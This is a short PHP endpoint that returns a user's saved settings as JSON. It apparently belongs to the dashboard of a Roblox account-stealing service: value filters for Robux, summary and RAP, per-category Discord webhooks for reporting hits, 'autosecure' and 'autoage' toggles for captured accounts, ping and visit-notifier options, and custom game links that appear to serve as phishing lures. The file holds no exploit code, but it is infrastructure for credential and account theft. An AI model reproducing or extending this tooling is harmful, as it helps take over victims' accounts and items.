<?php

require_once( $_SERVER[ "DOCUMENT_ROOT" ] . "/functional/account.php" );

header( "content-type: application/json; charset=utf-8" );

$info = require_account( true );

die( json_encode( [
    "minimum" => [
        "robux" => (int) ( $info[ "robux_filter" ] ?? 0 ),
        "summary" => (int) ( $info[ "summary_filter" ] ?? 0 ),
        "rap" => (int) ( $info[ "rap_filter" ] ?? 0 ),
    ],
    "webhooks" => [
        "default" => $info[ "discord_webhook" ] ?? "",
        "robux" => $info[ "robux_webhook" ] ?? "",
        "summary" => $info[ "summary_webhook" ] ?? "",
        "rap" => $info[ "rap_webhook" ] ?? "",
    ],
    "dashboard" => [
        "anonymous" => (bool) ( $info[ "dashboard_anonymous" ] ?? 0 ),
        "autosecure" => (bool) ( $info[ "dashboard_autosecure" ] ?? 0 ),
        "autoage" => (bool) ( $info[ "dashboard_autoage" ] ?? 0 ),
    ],
    "embed" => [
        "pingEveryone" => (bool) ( $info[ "discord_everyone" ] ?? 0 ),
        "pingHere" => (bool) ( $info[ "discord_here" ] ?? 0 ),
        "visitNoti" => (bool) ( $info[ "discord_visit_notifier" ] ?? 0 ),
    ],
    "customGameLink" => $info[ "custom_game_links" ] ?? "",
], JSON_UNESCAPED_SLASHES ) );
?>
